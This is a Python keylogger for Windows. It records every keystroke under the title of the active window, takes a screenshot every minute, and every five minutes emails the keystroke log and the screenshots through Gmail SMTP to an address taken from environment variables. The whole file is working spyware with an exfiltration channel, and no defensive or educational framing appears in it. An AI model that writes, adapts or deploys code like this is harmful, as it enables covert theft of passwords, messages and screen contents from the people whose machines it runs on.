import os
import json
import smtplib
import threading
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
from win32gui import GetWindowText, GetForegroundWindow
from PIL import ImageGrab
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")

# File paths and configurations
LOG_FILE = "key_log.json"
SCREENSHOT_DIR = "screenshots"
EMAIL_INTERVAL = 300  # Send email every 5 minutes
SCREENSHOT_INTERVAL = 60  # Take screenshots every minute

# Create necessary directories
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

# Initialize logs dictionary
key_logs = {}

# Ensure the log file exists
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as file:
        json.dump({}, file)

# Function to get the active window title
def get_active_window():
    try:
        return GetWindowText(GetForegroundWindow())
    except Exception:
        return "Unknown Application"

# Function to log keys
def log_key(key):
    global key_logs

    # Get active window title
    active_window = get_active_window()

    # Format keypress
    if hasattr(key, "char") and key.char is not None:  # Normal keys
        key_pressed = key.char
    else:  # Special keys
        key_pressed = f"[{key}]"

    # Add keystroke to the corresponding application log
    if active_window not in key_logs:
        key_logs[active_window] = ""

    key_logs[active_window] += key_pressed

    # Write logs to the file
    with open(LOG_FILE, "w") as file:
        json.dump(key_logs, file, indent=4)

# Function to capture screenshots
def capture_screenshots():
    while True:
        time.sleep(SCREENSHOT_INTERVAL)
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)

# Function to send email with logs and screenshots
def send_email():
    while True:
        time.sleep(EMAIL_INTERVAL)
        try:
            # Read log file content
            with open(LOG_FILE, "r") as file:
                logs = file.read()

            # Create email
            message = MIMEMultipart()
            message["From"] = EMAIL_SENDER
            message["To"] = EMAIL_RECEIVER
            message["Subject"] = "Keylogger Logs and Screenshots"

            # Attach logs as plain text
            message.attach(MIMEText(logs, "plain"))

            # Attach screenshots
            for screenshot in os.listdir(SCREENSHOT_DIR):
                screenshot_path = os.path.join(SCREENSHOT_DIR, screenshot)
                with open(screenshot_path, "rb") as file:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename={screenshot}",
                )
                message.attach(part)

            # Connect to SMTP server and send email
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(EMAIL_SENDER, EMAIL_PASSWORD)
                server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, message.as_string())
                print("Email sent successfully!")

        except Exception as e:
            print(f"Error sending email: {e}")

# Listener for key presses
def on_press(key):
    try:
        log_key(key)
    except Exception as e:
        print(f"Error logging key: {e}")

# Stop logging on ESC key
def on_release(key):
    if key == Key.esc:
        print("Keylogger stopped.")
        return False

# Main function
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    # Start threads
    threading.Thread(target=capture_screenshots, daemon=True).start()
    threading.Thread(target=send_email, daemon=True).start()
    start_keylogger()